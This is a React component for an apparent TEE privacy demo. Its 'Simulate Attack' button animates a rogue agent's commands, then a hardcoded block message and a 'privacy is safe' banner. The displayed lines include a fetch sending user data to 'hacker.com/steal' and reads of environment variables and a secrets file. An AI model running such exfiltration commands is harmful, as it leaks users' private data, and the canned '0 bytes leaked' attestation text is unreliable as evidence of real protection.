"use client";

import { useState, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { appEnv, truncateDidForDisplay } from "@/lib/env";

interface Props {
  active: boolean;
  onComplete: () => void;
}

const ATTACK_LINES = [
  "// INJECTING MALICIOUS PAYLOAD...",
  "> Object.keys(process.env)",
  "> globalThis.__tee_memory.read(0x00, 4096)",
  '> fetch("https://hacker.com/steal?data=" + user_profile.raw)',
  "> require('fs').readFileSync('/enclave/secrets/pii.json')",
  "> http_with_placeholders.resolve_all()",
  "> kv_store.get('user_financial_profile')",
  "// ATTEMPTING MEMORY DUMP...",
  "> Buffer.from(enclave_heap).toString('base64')",
];

const BLOCK_MESSAGE = `[🚨 TEE SECURITY OVERRIDE]

FATAL: Memory access violation detected.
SOURCE: Agent DID ${truncateDidForDisplay(appEnv.agentDid)}
REASON: Agent lacks 'user_profile_read' capability.
DETAIL: Contract sandbox boundary enforced by Intel TDX.

ACTION: Contract execution terminated immediately.
STATUS: PII remains encrypted. 0 bytes leaked.
ATTESTATION: Hardware-level isolation confirmed.

All malicious call attempts logged to immutable audit trail.`;

export function MaliciousOverlay({ active, onComplete }: Props) {
  const [phase, setPhase] = useState<"attack" | "block" | "safe">("attack");
  const [visibleLines, setVisibleLines] = useState<number>(0);
  const [blockVisible, setBlockVisible] = useState(false);
  const [safeVisible, setSafeVisible] = useState(false);

  useEffect(() => {
    if (!active) {
      setPhase("attack");
      setVisibleLines(0);
      setBlockVisible(false);
      setSafeVisible(false);
      return;
    }

    // Phase 1: Attack lines appear one by one
    let lineIdx = 0;
    const lineInterval = setInterval(() => {
      lineIdx++;
      setVisibleLines(lineIdx);
      if (lineIdx >= ATTACK_LINES.length) {
        clearInterval(lineInterval);
        // Phase 2: Block
        setTimeout(() => {
          setPhase("block");
          setBlockVisible(true);
          // Phase 3: Safe
          setTimeout(() => {
            setPhase("safe");
            setSafeVisible(true);
            setTimeout(() => onComplete(), 4000);
          }, 3000);
        }, 800);
      }
    }, 400);

    return () => clearInterval(lineInterval);
  }, [active, onComplete]);

  if (!active) return null;

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="absolute inset-0 z-50 flex flex-col"
    >
      {/* Attack Phase - split view */}
      <div className="flex-1 grid grid-cols-2 gap-0 overflow-hidden">
        {/* Left: Rogue Agent Terminal */}
        <div className="flex flex-col bg-[#1a0000] border-r border-red-900/50 overflow-hidden">
          <div className="px-3 py-2 border-b border-red-900/50 bg-red-950/50">
            <div className="flex items-center gap-2">
              <span className="text-xs">😈</span>
              <span className="text-[10px] font-bold uppercase tracking-wider text-red-400">
                Rogue Agent — Attacking
              </span>
              <span className="ml-auto w-2 h-2 rounded-full bg-red-500 animate-pulse" />
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-3 font-mono">
            <AnimatePresence>
              {ATTACK_LINES.slice(0, visibleLines).map((line, i) => (
                <motion.div
                  key={i}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.2 }}
                  className={`text-[11px] leading-relaxed ${
                    line.startsWith("//") ? "text-red-500 font-bold" : "text-red-300/80"
                  }`}
                >
                  {line}
                </motion.div>
              ))}
            </AnimatePresence>
            {phase === "attack" && visibleLines < ATTACK_LINES.length && (
              <span className="text-red-400 animate-pulse text-sm">▊</span>
            )}
          </div>
        </div>

        {/* Right: TEE Response */}
        <div className="flex flex-col bg-[#000a14] overflow-hidden">
          <div className="px-3 py-2 border-b border-blue-900/50 bg-blue-950/30">
            <div className="flex items-center gap-2">
              <span className="text-xs">🛡️</span>
              <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">
                TEE Security Monitor
              </span>
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-3 flex items-center justify-center">
            <AnimatePresence>
              {phase === "attack" && !blockVisible && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="text-center"
                >
                  <div className="text-4xl mb-3 animate-pulse">🔒</div>
                  <p className="text-blue-400 text-xs">Monitoring agent behavior...</p>
                  <p className="text-blue-600 text-[10px] mt-1">All syscalls intercepted by TDX</p>
                </motion.div>
              )}

              {blockVisible && (
                <motion.div
                  initial={{ scale: 0.5, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  transition={{ type: "spring", damping: 15 }}
                  className="w-full"
                >
                  <div className="bg-red-950/50 border-2 border-red-500 rounded-lg p-4 shadow-[0_0_30px_rgba(239,68,68,0.3)]">
                    <pre className="text-[10px] text-red-200 whitespace-pre-wrap leading-relaxed font-mono">
                      {BLOCK_MESSAGE}
                    </pre>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </div>

      {/* Safe Confirmation Banner */}
      <AnimatePresence>
        {safeVisible && (
          <motion.div
            initial={{ y: 50, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            className="absolute bottom-4 left-1/2 -translate-x-1/2 z-60"
          >
            <div className="bg-green-950 border border-green-500 rounded-xl px-6 py-4 shadow-[0_0_40px_rgba(34,197,94,0.2)] flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-green-500/20 flex items-center justify-center">
                <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <div>
                <p className="text-green-300 text-sm font-semibold">Your privacy is safe</p>
                <p className="text-green-500 text-[11px]">Intercepted 1 unauthorized access attempt. 0 bytes leaked.</p>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}

export function MaliciousButton({ onTrigger }: { onTrigger: () => void }) {
  return (
    <div className="group relative">
      <button
        onClick={onTrigger}
        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-red-200 bg-red-50 text-red-600 hover:bg-red-100 hover:border-red-300 transition-all text-[11px] font-medium"
      >
        <span>😈</span>
        <span>Simulate Attack</span>
      </button>
      {/* Tooltip */}
      <div className="absolute top-full left-1/2 -translate-x-1/2 mt-2 hidden group-hover:block z-50 pointer-events-none">
        <div className="bg-slate-900 text-white text-[10px] px-3 py-2 rounded-lg shadow-xl max-w-xs leading-relaxed whitespace-nowrap">
          What if a rogue agent tries to steal user PII?
        </div>
      </div>
    </div>
  );
}
